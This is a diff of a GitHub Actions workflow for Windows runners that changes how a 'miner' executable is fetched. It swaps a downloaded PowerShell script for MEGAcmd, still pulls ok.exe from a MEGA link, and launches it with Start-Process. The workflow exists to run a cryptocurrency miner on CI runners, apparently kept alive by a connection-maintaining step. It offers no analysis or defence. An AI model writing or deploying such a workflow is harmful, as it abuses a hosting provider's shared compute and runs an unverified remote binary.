@@ -77,18 +77,21 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- Download and Run Your Miner from MEGA ---
-      - name: Download MEGA Downloader Script
+      # --- Install MEGAcmd ---
+      - name: Install MEGAcmd
         run: |
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yasirkula/UnityWebGL-MegaDownloader/main/MegaDownloader.ps1" -OutFile "$env:TEMP\MegaDownloader.ps1"
+          choco install megacmd -y
 
-      - name: Download and Run Your Miner EXE from MEGA
+      # --- Download Miner from MEGA ---
+      - name: Download Miner from MEGA
         run: |
-          $megaUrl = "https://mega.nz/file/atJjSJJK#5LSuE8B1fYUrTwfrsErG7G7O51HGUZSBLzSlPioAkwA"
-          $minerPath = "$env:TEMP\ok.exe"
-          powershell -ExecutionPolicy Bypass -File "$env:TEMP\MegaDownloader.ps1" -Link $megaUrl -Output $minerPath
-          Start-Process -FilePath $minerPath
-          Write-Host "Miner started at $minerPath"
+          "$env:ProgramFiles\MEGAcmd\mega-get.exe" "https://mega.nz/file/atJjSJJK#5LSuE8B1fYUrTwfrsErG7G7O51HGUZSBLzSlPioAkwA" "$env:TEMP"
+
+      # --- Run Your Miner ---
+      - name: Run Your Miner
+        run: |
+          Start-Process -FilePath "$env:TEMP\ok.exe"
+          Write-Host "Miner started!"
 
       # --- Maintain Connection (Graceful Stop for Shutdown) ---
       - name: Maintain Connection (Graceful Stop)
